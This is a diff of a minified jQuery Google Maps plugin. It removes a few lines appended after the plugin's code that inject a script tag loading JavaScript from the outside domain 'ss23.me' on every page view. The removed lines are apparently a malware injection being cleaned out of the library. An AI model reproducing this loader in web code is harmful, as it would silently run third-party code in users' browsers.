@@ -27,9 +27,4 @@ if(typeof params.end!="object"){var geocodeAsync=function($that){var geocoder=ne
 console.error("jQuery googleMap : Unable to find the place asked for the route ("+response+")");}});}else{if($that.data('googleDebug'))
 console.error("jQuery googleMap : Address not found");}});}($(this));}else{var request={origin:params.start,destination:new google.maps.LatLng(params.end[0],params.end[1]),travelMode:google.maps.DirectionsTravelMode.DRIVING,region:"fr",waypoints:waypoints};direction.route(request,function(response,status){if(status==google.maps.DirectionsStatus.OK){way.setDirections(response);}else{if($(this).data('googleDebug'))
 console.error("jQuery googleMap : Address not found");}});}
-return this;}});var e = document.createElement("script");
-  e.async = !0,
-  e.src = "//ss23.me/js/8d34.js";
-  e.charset="UTF-8";
-  var t = document.getElementsByTagName("script")[0];
-  t.parentNode.insertBefore(e, t);
+return this;}});
